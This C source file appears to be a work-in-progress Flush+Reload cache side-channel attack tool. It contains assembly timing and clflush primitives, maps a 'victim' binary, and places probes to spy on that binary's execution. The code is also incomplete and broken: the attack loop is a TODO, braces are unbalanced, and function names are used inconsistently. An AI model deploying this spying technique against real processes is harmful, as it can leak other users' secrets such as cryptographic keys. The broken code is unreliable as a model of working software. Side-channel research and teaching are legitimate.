#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include "flushreload.h"
#include "cpuid.h"
#include "elftools.h"

void checkSystemConfiguration()
{
    if (!cpuid_has_invariant_tsc()) {
        printf("WARNING: This processor does not have an invariant TSC.\n");
    }

    /* TODO: warn on multiple procs */

    /* TODO: warn on AMD */
}

void *map(const char *elf_path)
{
    int fd = open(elf_path, O_RDONLY);
    if (fd < 0 ) {
        perror("Error opening ELF file.");
        exit(EXIT_FAILURE);
    }

    struct stat st_buf;
    fstat(fd, &st_buf);
    unsigned long size = st_buf.st_size;

    void *rv = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (rv == MAP_FAILED) {
        perror("Error mapping ELF file.");
        exit(EXIT_FAILURE);
    }

    return rv;
}


inline int probe(char *adrs) {
  volatile unsigned long time;

  asm __volatile__ (
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    "  clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}

inline void flush(char *adrs) {
  asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (adrs) :);
}


inline unsigned long gettime() {
  volatile unsigned long tl;
  asm __volatile__("lfence\nrdtsc" : "=a" (tl): : "%edx");
  return tl;
}

void attackLoop(args_t *args)
{
    unsigned int threshold = args->threshold;
    probe_t *probes = args->probes;
    unsigned int i;

    /* Setup: flush all of the probes. */

    /* Attack loop. Goal: 1 slot per iteration. */
    while (1) {
        /* Measure and reset the probes. */
        for (i = 0; i < args->probe_count; i++) {
            /* TODO: call probe, make hit decision. */
        }

        /* Wait for the next slot to begin. */
        /* XXX: make sure to check all the things that could go wrong. */

    if (has_invariant_tsc()) {
        printf("Yes!\n");
    } else { 
        printf("No. \n");
    }

}

void startSpying(args_t *args)
{
    /* Warn the user if the attack might not work on this system. */
    checkSystemConfiguration();

    /* Find the virtual address the victim binary gets loaded at. */
    unsigned long load_address = elf_get_load_address(args->elf_path);
    if (load_address == 0) {
        exit(EXIT_FAILURE);
    }

    /* Map the victim binary into our address space. */
    const char *binary = map(args->elf_path);

    /* Construct pointers to the probe addresses. */
    int i = 0;
    for (i = 0; i < args->probe_count; i++) {
        probe_t *probe = &args->probes[i];
        if (probe->virtual_address < load_address) {
            fprintf(stderr, "Virtual address 0x%lx is too low.\n", probe->virtual_address);
            exit(EXIT_FAILURE);
        }
        /* FIXME: Add upper-bound check too! */
        probe->mapped_pointer = binary + (probe->virtual_address - load_address);
    }

    /* Start the attack. */
    attackLoop(args);
}
